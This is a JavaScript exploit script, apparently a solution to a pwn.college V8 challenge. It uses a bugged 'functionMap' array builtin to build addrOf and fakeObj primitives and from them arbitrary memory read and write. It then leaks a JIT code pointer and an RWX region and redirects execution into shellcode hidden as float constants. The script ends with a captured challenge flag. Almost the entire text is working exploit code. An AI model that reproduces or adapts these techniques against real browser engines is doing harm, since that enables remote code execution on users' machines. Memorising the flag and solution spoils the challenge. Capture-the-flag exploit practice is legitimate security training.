var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);
var u32_buf = new Uint32Array(buf);

function f2i(val) {
    f64_buf[0] = val;
    return u64_buf[0];
}

function i2f(val) {
    u64_buf[0] = BigInt(val);
    return f64_buf[0];
}

function i2u_lo(i) {
    u64_buf[0] = BigInt(i);
    return u32_buf[0];
}

function i2u_hi(i) {
    u64_buf[0] = BigInt(i);
    return u32_buf[1];
}

function u2f(lo, hi) {
    u32_buf[0] = lo;
    u32_buf[1] = hi;
    return f64_buf[0];
}

function u2i(lo, hi) {
    u32_buf[0] = lo;
    u32_buf[1] = hi;
    return u64_buf[0];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK = (m) => console.log(`[+] ${m}`);
const logErr = (m) => console.log(`[-] ${m}`);

function toHex(x, w = 16) {
    x = BigInt.asUintN(64, x);
    return "0x" + x.toString(16);
}

function assert(c) {
    if (!c) {
        throw "Assertion Failed";
    }
}

function shellcode() {
    return [
        1.9995716422075807e-246,
        1.9710255944286777e-246,
        1.97118242283721e-246,
        1.971136949489835e-246,
        1.9711826272869888e-246,
        1.9711829003383248e-246,
        -9.254983612527998e+61
    ];
}

for (let i = 0; i < 10000; i++) shellcode();

function AddrOf(target) {
    let arr = [1.1, 1.1, 1.1];
    let addr = undefined;
    let idx = 0;

    arr.functionMap((value) => {
        switch (idx) {
            case 0:
                arr[2] = target;
                idx++;
                return value;
            case 1:
                addr = f2i(value);
                idx++;
                return value;
            default:
                idx++;
                return value;
        }
    });
    return addr;
}

function FakeObj(addr) {
    let arr = [1.1, 1.1, 1.1];
    let idx = 0;
    let obj = {};

    arr.functionMap((value) => {
        switch (idx) {
            case 0:
                arr[2] = obj;
                idx++;
                return i2f(addr);
            default:
                idx++;
                return value;
        }
    });
    return arr[0];
}

let fake_double_map = [i2f(0x31040404001c01b5n), i2f(0x0a8007ff11000844n)];
let fake_double_map_addr = AddrOf(fake_double_map) + 0x54n;
logInfo(`fake_double_map_addr: ${toHex(fake_double_map_addr)}`);

let shellcode_addr = AddrOf(shellcode);
logInfo("Shellcode addr: " + toHex(shellcode_addr));

let fake_array = [u2f(i2u_lo(fake_double_map_addr), 0), u2f(i2u_lo(shellcode_addr), 100)]
let fake_array_addr = AddrOf(fake_array);

let fake_obj = FakeObj(fake_array_addr + 0x54n);

function ArbRead(addr) {
    fake_array[1] = u2f(i2u_lo(addr - 0x8), 100);
    return f2i(fake_obj[0]);
}

function ArbWrite(addr, value) {
    fake_array[1] = u2f(i2u_lo(addr - 0x8), 100);
    fake_obj[0] = i2f(value);
}

let code_addr = ArbRead(i2u_lo(shellcode_addr) + 0xc);
logOK("Leaked code addr: " + toHex(code_addr));

let rwx_addr = ArbRead(i2u_lo(code_addr) + 0x14)
logOK("Leaked rwx addr: " + toHex(rwx_addr));

let shellcode_start = rwx_addr + 0x69n + 0x2n;
logInfo("Shellcode start at: " + toHex(shellcode_start));

// %DebugPrint(shellcode);
ArbWrite(i2u_lo(code_addr) + 0x14, shellcode_start);
assert(ArbRead(i2u_lo(code_addr) + 0x14) == shellcode_start);

// %SystemBreak();
shellcode();
// pwn.college{c-FthVC14A65T9zfiPlk1jAm-rd.dlTO3UDL1MTNzYzW}
